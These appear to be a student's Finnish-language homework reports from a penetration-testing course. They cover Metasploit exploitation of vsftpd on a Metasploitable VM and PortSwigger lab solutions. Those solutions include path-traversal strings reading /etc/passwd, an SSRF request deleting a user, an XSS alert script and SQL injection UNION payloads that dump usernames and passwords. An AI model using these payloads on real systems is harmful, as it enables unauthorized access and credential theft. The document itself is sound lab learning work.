<img width="254" alt="komento" src="https://github.com/AkiAleksi/h3/assets/112399816/d99bf245-f63f-4929-ae91-442c4020625b">

Ajoin komennon ping www.google.com. Internet yhteys katkeaa

<img width="226" alt="komento 2" src="https://github.com/AkiAleksi/h3/assets/112399816/8a6a7283-3cc8-45c8-922e-e5e167822d87">

Tehtävien teko sessio päättyi 9.11.2023 klo 10:15. 
Tehtävien teko jatkuu 10.11.2023 klo 11:00.

# d.)

Ensin ajoin msfbd init komennon, jotta tulee database.
Sen jälkeen ajoin komennon msfconsole.
Sitten ajoin db_nmap -sn <kohde>
Näkyy, että metasploitable on päällä.

<img width="491" alt="-sn" src="https://github.com/AkiAleksi/h3/assets/112399816/5a942437-e64f-464e-b9bb-65c8f597abce">


Katsoin selaimesta.

<img width="906" alt="metasploitable" src="https://github.com/AkiAleksi/h3/assets/112399816/b9171664-6c98-4e9a-8d49-61d5b96b0fa7">





# e.)

ajoin komennon db_nmap -A -p0- <kohde>.


<img width="680" alt="1" src="https://github.com/AkiAleksi/h3/assets/112399816/67fc95ec-fafb-427c-9389-c4712921652f">



<img width="655" alt="2" src="https://github.com/AkiAleksi/h3/assets/112399816/fd40d87f-350e-40c7-882b-2c1e3ad567d1">



<img width="663" alt="3" src="https://github.com/AkiAleksi/h3/assets/112399816/564427b6-213e-4e13-9893-aadb5f7fbadd">

Skannauksessa näkyy kaikki mahdolliset portit. Siinä näkyy myös palvelutiedot, käyttöjärjestelmätiedot ja versiotiedot.

# f.)

Avasin msfconsolin. Syötin search vsftpd. use 1, set RHOSTS <kohde>, exploit.

Toisen tietokoneen shell auki.



<img width="658" alt="Screenshot 2023-11-10 at 14 57 07" src="https://github.com/AkiAleksi/h3/assets/112399816/368d5e17-8411-4765-813d-77f1788dfad7">











Lopuksi ajoin id. Näkyy root.

<img width="281" alt="Screenshot 2023-11-10 at 15 03 15" src="https://github.com/AkiAleksi/h3/assets/112399816/a380efcc-d88d-402a-8592-a23e48a34701">


# g.)

Ohjeet: https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646

Päivitin session meterpreter sessioksi. Ajoin komennot:
CTRL + Z,
y,
search shell_to_meterpreter,
use 0,
sessions -l,
show options,
set SESSION 1,
run,
sessions -i 2




<img width="545" alt="Screenshot 2023-11-10 at 15 33 54" src="https://github.com/AkiAleksi/h3/assets/112399816/77604fb8-75c3-480f-b6b5-c59abf0faf9a">






<img width="665" alt="meterpreter" src="https://github.com/AkiAleksi/h3/assets/112399816/e63ec3a1-885a-4611-b7dd-16a8e35fa4dd">

# h.)

ExploitDB on tietokanta, joka sisältää tietoja tietoturva-aukoista, haavoittuvuuksista
ja niiden hyödyntämiskeinoista.
Löysin tämän hyökkäyksen sieltä.
https://www.exploit-db.com/exploits/51746

Python skripti, joka pyrkii aiheuttamaan palvelunestohyökkäyksen OpenPLC WebServerin kolmanteen versioon. Kyseessä on siis Denial of Service (DoS) hyökkäys.

<img width="969" alt="Screenshot 2023-11-10 at 15 59 41" src="https://github.com/AkiAleksi/h3/assets/112399816/21b4e8ad-8135-4484-b956-e60505d8b2b8">

<img width="1007" alt="Screenshot 2023-11-10 at 16 01 49" src="https://github.com/AkiAleksi/h3/assets/112399816/2efabbf4-c107-4050-8e38-be461c81dfae">

# i.)

Ensin ajoin komennon searchsploit -u. Päivitin siis.

Sen jälkeen nmappasin ip-osoitteen.

<img width="454" alt="xddd" src="https://github.com/AkiAleksi/h3/assets/112399816/cf7b0dbb-5d51-4498-b083-cacccdc5fecb">

searchsploit vsftpd 2.3.4

<img width="372" alt="exploit" src="https://github.com/AkiAleksi/h3/assets/112399816/f3cb23dc-4328-4b7a-aca7-64501601740d">

Tämä viittaa siihen, että vsftpd-version 2.3.4:ssä voi olla tietoturva-aukko, ja Python-skriptiä tunnuksella 49757.py voi käyttää hyväksi etäältä Unix-pohjaisessa järjestelmässä.

# j.)

Nikto on tietoturvatrakastusohjelma. Se on suunniteltu palvelinten ja verkkosivustojen
haavoittuvuuksien havaitsemiseen.

Aja komento nikto -h <kohde>

<img width="497" alt="Screenshot 2023-11-10 at 17 07 51" src="https://github.com/AkiAleksi/h3/assets/112399816/2460b499-6dd0-4434-8023-7cae45d76fd9">

Skannauksessa näkyy, että Apache mod_negotiation on käytössä MultiViews:lla, mikä mahdollistaa tiedostonimien helpon bruteforcen.
Bruteforce tarkoittaa menetelmää, jossa kokeillaan systemaattisesti ja peräkkäin kaikkia vaihtoehtoja kunnes oikea vastaus löytyy.

# k.)
Lähde: https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/#:~:text=does%20Meterpreter%20work%3F-,Meterpreter%20is%20a%20Metasploit%20attack%20payload%20that%20provides%20an%20interactive,using%20in%2Dmemory%20DLL%20injection.

Tehtävän anto oli hieman epäselvä. Päätin perehtyä tarkemmin meterpreteriin.
Käytin sitä aikaisemmassa tehtävässä, mutta en tarkemmin pohtinut mikä se on.

Meterpreter on Metasploit Frameworkin osa. Se tarjoaa tehokkaan, joustavan sekä modulaarisen tietokonehyökkäyksen työkalun.
Se on suunniteltu olemaan huomaamaton ja jättämään mahdollisimman vähän jälkiä järjestelmään.
Se tukee myös kryptattua liikennettä, joka tekee siitä vaikean havaita perinteisillä verkon valvontatyökaluilla.
Kun Metasploit-hyökkäys on onnistunut ja Meterpreter-kuorma on käynnistetty kohdekoneella.
Se muodostaa sessioyhteyden, joka mahdollistaa hyökkääjälle laajan hallinnan kohteena olevasta järjestelmästä.
Meterpreter-sessio eroaa tavallisesta tietokoneen istunnosta monin tavoin. Meterpreter on Metasploit Frameworkin erityinen payload, 
joka tarjoaa kehittyneempiä työkaluja ja ominaisuuksia hyökkääjälle, kun hän on saanut pääsyn uhrin järjestelmään. 
Esimerkiksi perinteiset istunnot saattavat olla helposti havaittavissa ja seurattavissa. Meterpreter on taas suunniteltu olemaan huomaamaton.

<img width="665" alt="meterpreter" src="https://github.com/AkiAleksi/h3/assets/112399816/e63ec3a1-885a-4611-b7dd-16a8e35fa4dd">



Tehtävien teko päättyi 10.11.2023 klo: 21:56


# Lähteet

 https://www.youtube.com/watch?v=Ul9WmUY49oM
 https://kulonpaa.com/?p=87
 https://www.geeksforgeeks.org/how-to-install-metasploitable-2-in-virtualbox/
 https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646
 https://www.exploit-db.com/exploits/51746
 https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/#:~:text=does%20Meterpreter%20work%3F-,Meterpreter%20is%20a%20Metasploit%20attack%20payload%20that%20provides%20an%20interactive,using%20in%2Dmemory%20DLL%20injection.

 # h4

# x


A01:2021 – Broken Access Control 

-94%:sta sovelluksista testattiin jollain tavalla rikkoutuneen pääsynhallinnan varalta keskimääräisen ilmenevyysasteen ollessa 3.81%, ja se esiintyi eniten osallistuneessa datasetissä yli 318 000 kertaa. 

-Huomionarvoisia yleisiä heikkouksien luettelointeja (CWE) ovat CWE-200: Herkkien tietojen paljastuminen valtuuttamattomalle toimijalle, CWE-201: Herkän tiedon lisääminen lähetettyihin tietoihin ja CWE-352: Ristiinsivustoista pyyntöjen väärentämistä.

-Pääsynhallinta toteuttaa käytäntöjä niin, että käyttäjät eivät voi toimia oman tarkoitetun käyttöoikeutensa ulkopuolella. Epäonnistumiset johtavat yleensä valtuuttamattomaan tietojen paljastumiseen, muokkaamiseen tai tuhoamiseen, tai käyttäjän rajojen ulkopuolisen liiketoimintatoiminnon suorittamiseen.

-Pääsynhallinta on tehokasta vain luotetussa palvelinpuolen koodissa tai palvelimetöntä API:ta käytettäessä, missä hyökkääjä ei voi muokata pääsynhallinnan tarkistusta tai metadataa.



* A10:2021 – Server-Side Request Forgery (SSRF)


-SSRF-haavoittuvuudet ilmenevät aina, kun verkkosovellus noutaa etäresurssia ilman käyttäjän toimittaman URL-osoitteen validoimista. Se mahdollistaa hyökkääjän pakottaa sovelluksen lähettämään muokatun pyynnön odottamattomaan kohteeseen, vaikka se olisi suojattu palomuurilla, VPN:llä tai toisentyyppisellä verkon pääsynhallintalistalla (ACL). Pääsynhallintahaavoittuvuudet ja oikeuksien laajennukset



* Server-side template injection


-Palvelinpuolen mallinjäykkäys tapahtuu, kun hyökkääjä pystyy käyttämään alkuperäistä mallisyntaksia upottaakseen haitallisen kuormituksen malliin, joka suoritetaan sitten palvelinpuolella

-Palvelinpuolen mallinjäykkyyshaavoittuvuudet voivat altistaa verkkosivustot monenlaisille hyökkäyksille riippuen kyseessä olevasta mallimoottorista ja siitä, miten sovellus tarkalleen ottaen sitä käyttää.

-Palvelinpuolen mallinjäykkyyshaavoittuvuudet syntyvät, kun käyttäjän antama syöte yhdistetään malleihin sen sijaan, että se siirrettäisiin dataksi.

* Server-side request forgery (SSRF)


-Palvelinpuolen pyynnön väärentäminen on verkkoturvahaavoittuvuus, joka mahdollistaa hyökkääjän aiheuttaa palvelinpuolen sovelluksen tekemään pyyntöjä ei-tarkoitetulle sijainnille.

-Onnistunut SSRF-hyökkäys voi usein johtaa valtuuttamattomiin toimiin tai pääsyyn tietoihin organisaatiossa. Tämä voi tapahtua joko haavoittuvassa sovelluksessa tai muissa taustajärjestelmissä, joiden kanssa sovellus voi viestiä. Joissakin tilanteissa SSRF-haavoittuvuus saattaa mahdollistaa hyökkääjän suorittaa mielivaltaisia komentoja.

* Cross-site scripting


-Cross-site scripting (tunnetaan myös nimellä XSS) on verkkoturvahaavoittuvuus, joka mahdollistaa hyökkääjän vaarantaa vuorovaikutukset, joita käyttäjillä on haavoittuvan sovelluksen kanssa. Se sallii hyökkääjän kiertää samaa alkuperäisperiaatetta, joka on suunniteltu erottamaan eri verkkosivustot toisistaan. Cross-site scripting -haavoittuvuudet mahdollistavat yleensä hyökkääjän teeskennellä uhriksi joutunutta käyttäjää, suorittamaan mitä tahansa toimintoja, joita käyttäjä voi tehdä, ja saamaan pääsyn kaikkiin käyttäjän tietoihin.

-Cross-site scripting toimii manipuloimalla haavoittuvaa verkkosivustoa niin, että se palauttaa käyttäjille haitallista JavaScript-koodia. Kun haitallinen koodi suoritetaan uhrihenkilön selaimessa, hyökkääjä voi täysin vaarantaa heidän vuorovaikutuksensa sovelluksen kanssa.



# a.)


Latasin oswap zapin. Valitsin tuon toisiksi alimmaisen.

<img width="611" alt="Screenshot 2023-11-17 at 20 01 55" src="https://github.com/AkiAleksi/h4/assets/112399816/699ca0c3-d41e-4e72-bef8-6a47082b7d76">

navigoin cd /usr/share/zaproxy/
Sen jälkeen ajoin java -jar <kohde> komennon. Se käynnistää zapin.

<img width="634" alt="Screenshot 2023-11-17 at 20 00 21" src="https://github.com/AkiAleksi/h4/assets/112399816/8aa49a76-1d9d-41e0-8b06-943bd2daab84">


Zap käynnissä

<img width="651" alt="Screenshot 2023-11-16 at 14 05 02" src="https://github.com/AkiAleksi/h4/assets/112399816/3c56d989-1215-4f49-b9a5-f1848741cc61">


Zap näkyy

Loin CA-sertifikaatin. Zapissa sertifikaatti luodaan menemällä Options -> Server Certificates -> Save. Sitten paikan valinta.
Sitten laitoin hakukenttään localhost:8080. Zapin sivut aukesi. Latasin sertifikaatin zapin sivuilta.






<img width="659" alt="Screenshot 2023-11-17 at 20 18 27" src="https://github.com/AkiAleksi/h4/assets/112399816/3df089aa-412b-487e-bc7f-1e8e6f454728">


importtasin sertifikaatin.



<img width="645" alt="Screenshot 2023-11-17 at 20 20 40" src="https://github.com/AkiAleksi/h4/assets/112399816/49d96942-2597-4162-a6fe-db40f6d3b41e">


Latasin Foxyproxyn, jo tässä kohtaa kun ei toiminut localhostissa ilman sitä.


<img width="516" alt="Screenshot 2023-11-17 at 20 27 22" src="https://github.com/AkiAleksi/h4/assets/112399816/3a70d03b-31e7-4891-a4ef-6677ac83d17f">

Käynnistin sen


<img width="659" alt="Screenshot 2023-11-17 at 20 29 00" src="https://github.com/AkiAleksi/h4/assets/112399816/bc89e4f3-1386-4158-85b0-95dbc0266a5f">

Menin web security academyyn. Hakupyyntö ilmestyi Zapin käyttöliittymään.


<img width="766" alt="Screenshot 2023-11-18 at 15 26 11" src="https://github.com/AkiAleksi/h4/assets/112399816/363a5d62-c78c-40b2-9cd8-33bd695c2dd0">





# b.)

Latasin Foxyproxyn. Menin add extensions. Hain Foxyproxya. Sen jälkeen lisäsin sen.



<img width="516" alt="Screenshot 2023-11-17 at 20 27 22" src="https://github.com/AkiAleksi/h4/assets/112399816/3a70d03b-31e7-4891-a4ef-6677ac83d17f">

Lisäsin foxyproxy profiilit.





<img width="944" alt="Screenshot 2023-11-17 at 21 37 24" src="https://github.com/AkiAleksi/h4/assets/112399816/ffb5f90b-ee19-4b29-ac62-520a89774137">





Käynnistin profiilin.


<img width="659" alt="Screenshot 2023-11-17 at 20 29 00" src="https://github.com/AkiAleksi/h4/assets/112399816/bc89e4f3-1386-4158-85b0-95dbc0266a5f">

Asetin proxyn


<img width="929" alt="Screenshot 2023-11-17 at 20 59 15" src="https://github.com/AkiAleksi/h4/assets/112399816/b369bb16-bff1-48a2-a776-eb7be3d2ed9f">

FoxyProxy toimii



<img width="382" alt="Screenshot 2023-11-18 at 12 05 06" src="https://github.com/AkiAleksi/h4/assets/112399816/fbc32ca9-f616-4e5a-ac64-de4f5a122c2d">






# c.)

Menin live chattiin ja chattasin. Sen jälkeen view transcript. 
Huomasin, että numeroitu txt file 2.txt

<img width="646" alt="chat" src="https://github.com/AkiAleksi/h4/assets/112399816/36b7d754-b407-47a3-9c05-bc945b1c4feb">

Katsoin kaappauksen zapista. Muokkasin pyyntöä.
Ensin laitoin 0.txt. En saanut mitään.
Sen jälkeen kokeilin 1.txt sain salasanan


<img width="908" alt="intercept" src="https://github.com/AkiAleksi/h4/assets/112399816/7e812faf-decd-48e2-b1f0-0ee7cbfc4f4f">

Kokeilin kirjautua tunnuksella ja salasanalla. Pääsin kirjautumaan sisään. 
Salasana oli oikein. 

<img width="678" alt="solved" src="https://github.com/AkiAleksi/h4/assets/112399816/15a93f0b-be10-4b6a-b2c6-2c838292240c">

Lab solved!!!

# d.)

Laitoin kuvat mukaan History-osaan: Tools > Options > Display > Process images in HTTP requests/responses
Kaappasin zapilla pyynnön, jolla haetaan kuva.


<img width="522" alt="Screenshot 2023-11-18 at 22 20 34" src="https://github.com/AkiAleksi/h4/assets/112399816/d0b097b6-80c6-4575-a936-9d2937e309fb">



Pyynnön kohta filename on hyökättävissä tämän hyökkäyksen avulla.
Muutin siihen ../../../../etc/passwd



<img width="436" alt="Screenshot 2023-11-18 at 22 21 09" src="https://github.com/AkiAleksi/h4/assets/112399816/ba451d3b-7059-4a5c-8f2d-fa472b9f988a">



Path traversal hyökkäys onnistui!



<img width="461" alt="Screenshot 2023-11-18 at 22 21 33" src="https://github.com/AkiAleksi/h4/assets/112399816/efebeac8-94f8-433a-98dd-11378d38ff66">




Lab ratkaistu

<img width="618" alt="Screenshot 2023-11-18 at 14 04 13" src="https://github.com/AkiAleksi/h4/assets/112399816/260d825b-89f8-49e6-9a44-70fc5133ec53">






# e.)



Kaappasin taas pyynnön ja muokkasin sitä.
GET https://0a4f00a803cca70c836b50ec00ac0006.web-security-academy.net/image?filename=/etc/passwd

<img width="440" alt="Screenshot 2023-11-18 at 22 28 05" src="https://github.com/AkiAleksi/h4/assets/112399816/00b70ec4-7837-41fc-ac7d-a1709a0ef823">


Hyökkäys onnistui


<img width="232" alt="Screenshot 2023-11-18 at 22 30 13" src="https://github.com/AkiAleksi/h4/assets/112399816/f8a10e25-2c87-4951-806e-8756ddaa4a70">


Lab ratkaistu!


<img width="639" alt="Screenshot 2023-11-18 at 14 12 33" src="https://github.com/AkiAleksi/h4/assets/112399816/943f765c-7d87-44ab-8102-0bede4e3bf6e">


# f.)



Kaappasin pyynnön. 

<img width="466" alt="Screenshot 2023-11-18 at 22 33 37" src="https://github.com/AkiAleksi/h4/assets/112399816/d1bdc96d-62ec-49d3-b7ce-36c6bd498f78">





Muokkasin pyyntöä ....//....//....//etc/passwd


<img width="242" alt="Screenshot 2023-11-18 at 22 34 01" src="https://github.com/AkiAleksi/h4/assets/112399816/92c97fa4-ad22-4ff7-a799-80a7645d3895">




Hyökkäys onnistui!



<img width="456" alt="Screenshot 2023-11-18 at 22 34 15" src="https://github.com/AkiAleksi/h4/assets/112399816/a4b37ac1-4eb3-4010-9992-436684385752">




# g.)

Tämä kohta jäi valitettavasti tekemättä ajan loppumisen vuoksi.

# h.)

Menin tuotesivulle. Klikkasin check stock painiketta. 
Kyseinen pyyntö ilmestyi zappiin.

<img width="585" alt="Screenshot 2023-11-18 at 15 48 57" src="https://github.com/AkiAleksi/h4/assets/112399816/8c9d5a3e-e370-4c06-978e-b7af79da1716">

Pyynnössä näkyy stockApi. Klikkasin Request editoria kyseisen
pyynnön suhteen. Lähetin väärennetyn pyynnön stockApi=http://localhost/admin

<img width="456" alt="Screenshot 2023-11-18 at 15 50 17" src="https://github.com/AkiAleksi/h4/assets/112399816/f88279db-3952-4722-92eb-0f9fc7a7b155">

HTML:ssä näkyy kohta, jossa poistetaan carlos.


<img width="437" alt="Screenshot 2023-11-18 at 15 51 53" src="https://github.com/AkiAleksi/h4/assets/112399816/5db9246e-c6f0-4ecb-a82f-daffd83a17d2">





Annetaan väärennetty pyyntö stockApi=http://localhost/admin/delete?username=carlos


<img width="434" alt="Screenshot 2023-11-18 at 15 58 52" src="https://github.com/AkiAleksi/h4/assets/112399816/20d62486-6948-45c1-b157-7ddcea22861d">


Lab solved!!

# i.)


Search box syöttää siihen kirjoitetun koodin.
Testataan antamalla html komento 


<img width="444" alt="Screenshot 2023-11-18 at 16 41 29" src="https://github.com/AkiAleksi/h4/assets/112399816/41d80b11-814f-4013-9117-3907d64e65c9">




Se toimii. Kokeillaan seuraavaksi skriptiä.
Syötetään <script>alert()</script>






<img width="366" alt="Screenshot 2023-11-18 at 16 45 07" src="https://github.com/AkiAleksi/h4/assets/112399816/fc489d79-d77f-4b98-beb4-1ebee4ca0632">







alert box tulee esiin.






<img width="424" alt="Screenshot 2023-11-18 at 16 44 21" src="https://github.com/AkiAleksi/h4/assets/112399816/63c26178-1b14-402a-a629-92017ada87fd">





Lab ratkaistu






<img width="440" alt="Screenshot 2023-11-18 at 16 44 35" src="https://github.com/AkiAleksi/h4/assets/112399816/b33b3bff-96db-4baa-97a8-dbc5f21c79ae">

# j.)

Syötin kommentin ja kaappasin sen zapilla.


<img width="436" alt="Screenshot 2023-11-18 at 17 29 08" src="https://github.com/AkiAleksi/h4/assets/112399816/b0c558ea-687e-46f0-9293-116071ec38af">


Muutin sitä


<img width="168" alt="Screenshot 2023-11-18 at 17 33 12" src="https://github.com/AkiAleksi/h4/assets/112399816/4fac5812-f13e-49bd-b69d-d1d76a220a22">



Lab ratkaistu!


<img width="157" alt="Screenshot 2023-11-18 at 17 34 48" src="https://github.com/AkiAleksi/h4/assets/112399816/d9bd8517-5808-4047-8433-64a33a462582">


# k.)

https://owasp.org/www-project-webgoat/


<img width="864" alt="Screenshot 2023-11-18 at 17 48 07" src="https://github.com/AkiAleksi/h4/assets/112399816/0a76c286-32fe-4e2b-828f-8fb7a336b8a5">


<img width="457" alt="Screenshot 2023-11-18 at 17 47 00" src="https://github.com/AkiAleksi/h4/assets/112399816/f80013fa-6172-4b4c-9a4c-2fbe4f1d3794">

# m.)



Hijack a session (1)

Tässä näkyy cookie.
En tiedä miten sitä olisi pitänyt tulkita.


<img width="432" alt="Screenshot 2023-11-18 at 19 37 34" src="https://github.com/AkiAleksi/h4/assets/112399816/a15882b2-cbb4-4c8a-9898-ee67062607a0">


Loput tehtävät jäivät valitettavasti tekemättä. Aika loppui kesken.
Aliarvion ajan, jota tehtävät vievät. Pitää jatkossa varata enemmän aikaa tehtävien tekoon.
Jatkan tehtävien tekoa myöhemmin.

Insecure Direct Object References (4)


Missing Function Level Access Control (3)
Spoofing an Authentication Cookie (1)

# n) 
(A7) Identity & Auth Failure (WebGoat 2023.4)
Authentication Bypasses (1)
Insecure Login (1)

# o) 
(A10) Server-side Request Forgery (WebGoat 2023.4)
Server-Side Request Forgery (2)

# p) 
Client side (WebGoat 2023.4)
Bypass front-end restrictions (2)

# Lähteet

https://www.youtube.com/watch?v=17KYOIf5ZbU&embeds_referring_euri=https%3A%2F%2Fportswigger.net%2F&embeds_referring_origin=https%3A%2F%2Fportswigger.net&source_ve_path=MjM4NTE&feature=emb_title

https://www.zaproxy.org/docs/

https://owasp.org/www-project-webgoat/

https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/

https://portswigger.net/web-security/cross-site-scripting

Käytin tiivistelmässä kääntämiseen ChatGPT


# h5

# x

Poimin mielestäni tärkeimmät poiminnat lähteistä.
Tein tämän englanniksi, kun tekstikin oli englanniksi.


PostgreSQL Install and One Table Database – SQL CRUD tutorial for Ubuntu

Three line install

$ sudo apt-get update

$ sudo apt-get -y install postgresql

$ sudo systemctl start 

$ sudo -u postgres createdb $(whoami)

$ sudo -u postgres createuser $(whoami)

The trick is to use your Linux system username for PostgreSQL database and PostgreSQL user. Then authentication is automatic.

$ psql

table

CREATE TABLE students (id SERIAL PRIMARY KEY, name VARCHAR(200));
CREATE TABLE

insert

INSERT INTO students(name) VALUES ('Aki');
INSERT 0 1

select

SELECT * FROM students;

update

UPDATE students SET name='Aki Hietamäki' WHERE name='Aki';

UPDATE 1

delete

DELETE FROM students WHERE name='Aki Hietamäki';
DELETE 1
SELECT * FROM students;

SQL injection

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve.

A successful SQL injection attack can result in unauthorized access to sensitive data, such as:

Passwords.
Credit card details.
Personal user information.

You can detect SQL injection manually using a systematic set of tests against every entry point in the application. 

# a.)

ensiksi asensin ja käynnistin postgreSQL tietokannan

![alku](https://github.com/AkiAleksi/h5/assets/112399816/194cd8be-a30c-43e2-a335-f66ab08e8ec7)


Sen jälkeen loin tietokannan ja käyttäjän.


$ sudo -u postgres createdb kali


$ sudo -u postgres createuser kali


Tein käyttäjästä kali databasen ownerin komennolla:



sudo -u postgres psql -c "ALTER DATABASE kali OWNER TO kali;"



![alku3](https://github.com/AkiAleksi/h5/assets/112399816/59879e3a-48f4-4867-9e67-2102bd76bae2)


Loin uuden taulun:

CREATE TABLE students (id SERIAL PRIMARY KEY, name VARCHAR(200));

![1jee](https://github.com/AkiAleksi/h5/assets/112399816/d33a7880-6ad9-4c9e-b5be-d437df410e65)


CRUD
Loin uuden nimen tauluun.

INSERT INTO students(name) VALUES ('Aki');

Sen jälkeen tein Read kohdan komennolla:

SELECT * FROM students;

![2jee](https://github.com/AkiAleksi/h5/assets/112399816/0d4d2d24-e0f2-4c7d-b2b1-3793d2d516b6)


Päivitin nimen Aki. Nimeen Aki Hietamäki:

UPDATE students SET name='Aki Hietamäki' WHERE name='Aki Hietamäki'; 

![3jee](https://github.com/AkiAleksi/h5/assets/112399816/c6b810fb-84b6-487a-a866-d2884351726e)




Sen jälkeen poistin:

DELETE FROM students WHERE name='Aki';


![4jee](https://github.com/AkiAleksi/h5/assets/112399816/0d65a9ca-9814-4d9f-be7b-bd7765676269)


# b.)

SELECT * FROM Users WHERE id = 10 OR 1=1;

Yläpuolella oleva SQL lause palauttaa kaikki rivit "Users" taulusta,
koska OR 1=1 on aina tosi. Vaikka id 10 ei ole mitään sisältöä.


id avain on valmiina ohjelmassa. Käyttäjän syöte on id:n arvo ja johon on jatkettu OR lause.


![xdddd](https://github.com/AkiAleksi/h5/assets/112399816/e7b429b9-d019-493d-a320-c45d753e8f7e)

# c.)

Menin labissa niin, että sain category kohdan näkyviin.

![Screenshot 2023-11-24 at 14 12 37](https://github.com/AkiAleksi/h5/assets/112399816/f305305f-dbc7-41e8-b524-3ba3e7f4d075)

Muokkasin category parametria antamalla sille arvon '+OR+1=1--

![Screenshot 2023-11-24 at 14 13 13](https://github.com/AkiAleksi/h5/assets/112399816/c700b799-ade3-4bb8-a589-90c5960d7900)



# d.)

Muokkasin administrator parametria administrator'--

![Screenshot 2023-11-24 at 14 22 13](https://github.com/AkiAleksi/h5/assets/112399816/6501edc1-4712-43ec-8f7b-467a8b1a8e89)



![Screenshot 2023-11-24 at 14 23 20](https://github.com/AkiAleksi/h5/assets/112399816/810df58f-6ba5-4ae5-82f7-c5a7e251c392)


# e.)


Pitää selvittää tietokannan tyyppi ja versio. Haavoittuvuus on kategoria filtterissä.
ORACLE tietokanta.

Löysin injection tehtävää varten labin walkthroughsta.
Muokkasin kategori parametria.
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

![Screenshot 2023-11-24 at 15 17 33](https://github.com/AkiAleksi/h5/assets/112399816/b5504c02-1e81-435c-8e0a-71fd18f03f08)




# f.)

Tehtävänanto kertoo, että laboratoriossa on SQL-injektio haavoittuvuus tuotekategorian suodattimessa.

Löysin tehtävän lunntilapusta tämän komennon:

'+UNION+SELECT+@@version,+NULL#

Lisäsin komennon Zapissa kategoria kohtaan.


![Screenshot 2023-11-24 at 16 38 20](https://github.com/AkiAleksi/h5/assets/112399816/87f1af3d-33dc-4e81-aac8-655b4e6d5826)

Tehtävä suoritettu!!


# g.)


Etsin kaikki taulut tietokannasta

'union+select+table_name,'123'+from+all_tables--

![user1](https://github.com/AkiAleksi/h5/assets/112399816/088dba52-1367-410c-a349-a9108927e78d)



![user2](https://github.com/AkiAleksi/h5/assets/112399816/1993c581-7e6a-4209-a78e-a30807da7946)


Katsoin taulujen sisällön

'+union+select+column_name,'123'+from+all_tab_columns+where+table_name='APP_USERS_AND_ROLES'--

Tästä en löytänyt mitään mielenkiintoista.

'+union+select+column_name,'123'+from+all_tab_columns+where+table_name='USERS_VYMYAO'--

Tästä löytyi PASSWORD_ ja USERNAME_ kohdat.

![Screenshot 2023-11-25 at 12 53 09](https://github.com/AkiAleksi/h5/assets/112399816/75ec55ae-f133-4273-a09f-b0a3406db76e)


Etsin PASSWORD_RNBGTX ja USERNAME_ECTSRI sisällöt.

'+union+select+PASSWORD_RNBGTX,USERNAME_ECTSRI+from+USERS_VYMYAO--


![info](https://github.com/AkiAleksi/h5/assets/112399816/2e9d88f1-7fb7-44bc-8d93-30671a33410d)


Kirjauduin tiedoilla MY account sivulta.


![okkkk](https://github.com/AkiAleksi/h5/assets/112399816/344ac34f-7b55-4826-bfc8-baf0cd398285)


Lab suoritettu!!!!

# h.)

Katsoin läpikävelyn kyseisestä tehtävästä.

'UNION+SELECT+NULL,NULL--


internal server error

Lisäsin NULL niin kauan, että ei tullut erroria.

'UNION+SELECT+NULL,NULL,NULL,NULL--


![Screenshot 2023-11-25 at 13 38 10](https://github.com/AkiAleksi/h5/assets/112399816/fcbcb7f7-1bb3-4f1f-a7af-4aa00c957c6a)






![Screenshot 2023-11-25 at 13 34 49](https://github.com/AkiAleksi/h5/assets/112399816/5f0a0222-1079-415b-9746-a702579cc0c6)

# i.)

Tein zap kaappauksen. Laitoin komennon:

'+UNION+SELECT+username,password+FROM+users--   

![ggg](https://github.com/AkiAleksi/h5/assets/112399816/3b1b10d9-04ca-43c7-b75b-b905b4961710)


Löysin vastauksesta admin käyttäjänimen sekä salasanan.

![Screenshot 2023-11-25 at 14 02 58](https://github.com/AkiAleksi/h5/assets/112399816/1d823a47-037a-41ec-ba18-5000374d0c37)

Kirjauduin sisään näillä tiedoilla.

![Screenshot 2023-11-25 at 14 07 55](https://github.com/AkiAleksi/h5/assets/112399816/2035889e-45f1-4cec-93b7-696b26b7357f)

Lab ratkaistu.

# j.)


Tehtävässä pitää saada useita arvoja yhdelle sarakkeelle. 


Labin solutions kohdasta löysin komennon:

'+UNION+SELECT+NULL,username|| '-' ||password+FROM+users--


![kkkkkkkkkk](https://github.com/AkiAleksi/h5/assets/112399816/ce1024f6-f6f4-4688-a31e-710b8393cee5)


Sain vastauksen, josta löytyi adminin salasana.


![admin1](https://github.com/AkiAleksi/h5/assets/112399816/87743028-bcfd-493f-92f9-4e1e5e23769b)



Kirjoittamalla tiedot pääsin kirjautumaan sisään.



![ratkaisu](https://github.com/AkiAleksi/h5/assets/112399816/2bc8f513-880a-47d8-a856-45cdc6689196)




# Lähteet

https://www.youtube.com/watch?v=4UxUpsCZQfI

https://www.youtube.com/watch?v=MFTk_LNRW0g

https://www.youtube.com/watch?v=yRVYoqR9vrI

https://www.youtube.com/watch?v=ZbwIbIq5-eE

https://terokarvinen.com/2016/03/05/postgresql-install-and-one-table-database-sql-crud-tutorial-for-ubuntu/

https://owasp.org/www-project-top-ten/2017/A1_2017-Injection

https://portswigger.net/web-security/sql-injection/cheat-sheet
 
